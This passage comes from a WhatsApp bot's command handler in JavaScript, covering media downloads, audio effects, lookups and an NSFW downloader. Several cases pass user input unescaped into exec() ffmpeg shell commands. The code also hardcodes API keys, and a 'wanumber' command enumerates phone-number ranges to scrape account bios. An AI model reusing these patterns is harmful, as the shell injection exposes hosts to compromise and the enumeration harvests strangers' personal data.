          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                
            }
            break
            case 'wikimedia': {
                if (!text) return replygcveran('Enter Query Title')
                await VeranStickWait()
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                
            }
            break
    case 'aesthetic':{
await VeranStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
			case 'ebinary': {
if (!q) return replygcveran(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
replygcveran(eb)
}
break
case 'dbinary': {
if (!q) return replygcveran(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('./lib/binary')
let db = await dBinary(`${q}`)
replygcveran(db)
}
break
			  case 'volaudio': {
if (!args.join(" ")) return replygcveran(`Example: ${prefix + command} 10`)
media = await VeranBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcveran('Error!')
jadie = fs.readFileSync(rname)
VeranBotInc.sendMessage(m.chat, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return replygcveran(`Example: ${prefix + command} 10`)
media = await VeranBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcveran('Error!')
jadie = fs.readFileSync(rname)
VeranBotInc.sendMessage(m.chat, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
			case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcveran(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcveran(`Example : ${prefix + command} 😅+🤔`)
                await VeranStickWait()
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await VeranBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
			case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await VeranStickWait()
                let media = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygcveran(err)
                let buff = fs.readFileSync(ran)
                VeranBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcveran(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcveran(e)
                }
                break
			case 'toonce':
            case 'toviewonce': {
                if (!m.quoted) return replygcveran(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
                    VeranBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
                    VeranBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
                   VeranBotInc.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
			case 'fliptext': {
                if (args.length < 1) return replygcveran(`Example:\n${prefix}fliptext dgveran`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcveran(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
			case 'style': case 'styletext': {
		if (!text) return replygcveran('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcveran(teks)
	    }
	    break
			case 'obfus': case 'obfuscate':{
if (!text) return replygcveran(`Example ${prefix+command} const veranbot = require('baileys')`)
try {
let meg = await obfus(text)
replygcveran(`Success
${meg.result}`)
} catch {
	replygcveran(`Use the command properly\nExample ${prefix+command} const veranbot = require('baileys')`)
}
}
break
			case 'autodownload': case 'autodl':
if (!VeranTheCreator) return VeranStickOwner()
                
                if (q == 'on') {
                    db.settings[botNumber].autodownload = true
                    replygcveran(`Successfully Changed Auto Download To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].autodownload = false
                    replygcveran(`Successfully Changed Auto Download To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'weather':{
if (!text) return replygcveran('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = "";
            textw += `🌍 *Weather Report for ${text}*\n\n`;
            textw += `🌤️ *Weather:* ${wdata.data.weather[0].main}\n`;
            textw += `🌥️ *Description:* ${wdata.data.weather[0].description}\n`;
            textw += `🌡️ *Avg Temp:* ${wdata.data.main.temp}°C\n`;
            textw += `🤗 *Feels Like:* ${wdata.data.main.feels_like}°C\n`;
            textw += `🌬️ *Pressure:* ${wdata.data.main.pressure} hPa\n`;
            textw += `💧 *Humidity:* ${wdata.data.main.humidity}%\n`;
            textw += `🍃 *Wind Speed:* ${wdata.data.wind.speed} m/s\n`;
            textw += `🗺️ *Latitude:* ${wdata.data.coord.lat}\n`;
            textw += `🗺️ *Longitude:* ${wdata.data.coord.lon}\n`;
            textw += `🏳️ *Country:* ${wdata.data.sys.country}\n`;
            
           VeranBotInc.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'happymod':{
if (!q) return replygcveran(`Example ${prefix+command} Sufway surfer mod`)
await VeranStickWait()
let kat = await scp2.happymod(q)
replygcveran(util.format(kat))
}
break
case 'gdrive': {
		if (!args[0]) return replygcveran(`Enter the Google Drive link`)
	await VeranStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcveran(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	VeranBotInc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygcveran('Error: Check link or try another link') 
  }
}
break
           case 'git': case 'gitclone':
if (!args[0]) return replygcveran(`Here is my bot gitclone?\nExample :\n${prefix}${command} https://github.com/Veran350/VERAN-TECH-BOT`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcveran(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    VeranBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcveran(mess.error))
break


case 'spotify': {
  if (!text) return replygcveran(`*Where is the Song Name?*\n_Example :_\n${prefix}${command} Metamorphosis`)

  try {
    // Fetch Spotify search results
    let api = await fetchJson(`https://ytdl.giftedtech.workers.dev/?url=${text}`);
    
    if (!api.data || api.data.length === 0) {
      await VeranBotInc.sendMessage(m.chat, '❌ No results found on Spotify. Please try again with a different query.', { quoted: m });
      return;
    }

    // Prepare the response message with song information
    const songInfo = `*🎶 S P O T I F Y - D L 🎶*

• 🎵 *Title*: ${api.data[0].title}
• ⏱️ *Duration*: ${api.data[0].duration}
• ⭐ *Popularity*: ${api.data[0].popularity}
• 🔗 *Url*: ${api.data[0].url}`;

    // Send the song info to the user
    await VeranBotInc.sendMessage(m.chat, { text: songInfo }, { quoted: m });

    // Fetch the Spotify song download link
    let spodl = await fetchJson(`https://ytdl.giftedtech.workers.dev/?url=${api.data[0].url}`);
    const spoDl = spodl.data.download;

    // Send the Spotify song as an audio message with additional context (external ad reply)
    await VeranBotInc.sendMessage(m.chat, {
      audio: { url: spoDl },
      mimetype: 'audio/mpeg',
      contextInfo: {
        externalAdReply: {
          title: `🎵 - sᴘᴏᴛɪғʏ -`,
          body: api.data[0].title,
          thumbnailUrl: spodl.data.image, // Use the song's album image as thumbnail
          sourceUrl: global.sourceurl || spodl.data.url, // URL to the source (you can customize this)
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m });

  } catch (error) {
    console.error('Error fetching Spotify data:', error);
    await VeranBotInc.sendMessage(m.chat, { text: '❌ An error occurred while fetching the Spotify data. Please try again later.' }, { quoted: m });
  }
}
break;


			case 'mediafire': {
  	if (!args[0]) return replygcveran(`Enter the mediafire link next to the command`)
    if (!args[0].match(/mediafire/gi)) return replygcveran(`Link incorrect`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `
   ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
    VeranBotInc.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
    }
    break
			case 'remini': case 'vv': {
			if (!quoted) return replygcveran(`Where is the picture?`)
			if (!/image/.test(mime)) return replygcveran(`Send/Reply Photos With Captions ${prefix + command}`)
			await VeranStickWait()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: proses }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😍\",\"id\":\""}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
			}
			break
			case 'imdb':
if (!text) return replygcveran(`_Name a Series or movie`)
await VeranStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           VeranBotInc.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'itunes': {
if (!text) return replygcveran('Please provide a song name')
  try {
    let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let songInfo = 
    `*Song Information:*\n
     • *Name:* ${json.name}\n
     • *Artist:* ${json.artist}\n
     • *Album:* ${json.album}\n
     • *Release Date:* ${json.release_date}\n
     • *Price:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}`
    // Check if thumbnail is present, then send it with songInfo as caption
    if (json.thumbnail) {
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: songInfo
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({image: {url:json.thumbnail}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
    } else {
      replygcveran(songInfo)
    }
  } catch (error) {
    console.error(error)
  }
}
break
            case 'lyrics': {
if (!text) return replygcveran(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
await VeranStickWait()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
try {
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
const veranlirik = `
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: veranlirik
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}catch{
replygcveran(`Lyrics ${text} not found!`)
}
}
break
            case 'friend':
case 'searchfriend':{
await VeranStickWait()
let teman = pickRandom(veranverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygcveran('Managed to Get One Person')
}, 5000)
setTimeout(() => {
VeranBotInc.sendMessage(m.chat, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
            case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
           	if (!text) return replygcveran(`Provide Number with last number x\n\nExample: ${prefix + command} 2347082664317`)
var inputnumber = text.split(" ")[0]
        
        replygcveran(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await VeranBotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await VeranBotInc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Karachi').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcveran(`${text66}${nobio}${nowhatsapp}`)
        }
break
			case 'stickersearch': {
if (!text) return replygcveran(`Example : ${m.prefix + command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].url}
⭐ Total : ${json[0].total}
`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
			case 'apksearch': {
if (!text) return replygcveran(`Example : ${prefix + command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
    
💼 Title : ${json[0].package}
🔗 Link : ${json[0].url}
👤 Develoepr : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: capt
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: json[0].thumbnail }}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'readmore': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    VeranBotInc.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
			case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': {
	if (!m.isGroup) return VeranStickGroup()
	if (!AntiNsfw) return replygcveran(mess.nsfw)
  if (!text) return replygcveran(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: ${prefix+command} hot japanese\nyou can use a link as well\nExample: ${prefix+command} link *`);
    if (!text) return replygcveran('Please provide a search query or a valid Xvideos URL.');
    // Check if the input is a valid Xvideos URL
    const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
   try {
      if (isURL) {
        // If it's a valid URL, directly download the video
        const result = await xvideosdl(text);
        const { title, url } = result.result; 
        // Send the video file
        const response = await fetch(url);
        const buffer = await response.arrayBuffer();
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!!\nTitle: ${title}`
          }),
